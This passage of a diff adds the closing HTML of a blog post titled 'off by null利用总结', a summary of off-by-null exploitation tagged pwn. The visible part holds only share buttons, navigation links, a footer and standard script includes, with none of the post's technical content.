+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-title="off by null利用总结" data-via="xx" data-hashtags="pwn"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-title="off by null利用总结" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-title="off by null利用总结"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-title="off by null利用总结"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-title="off by null利用总结" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-title="off by null利用总结" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" data-title="off by null利用总结"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/pwn/">pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/introduction-to-the-python-sandbox-and-bytecode/" class="prev" rel="prev" title="Introduction to the python sandbox and bytecode"><i class="fas fa-angle-left fa-fw"></i>Introduction to the python sandbox and bytecode</a>
+            <a href="/sctf-wp/" class="next" rel="next" title="SCTF-WP">SCTF-WP<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Luexp</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
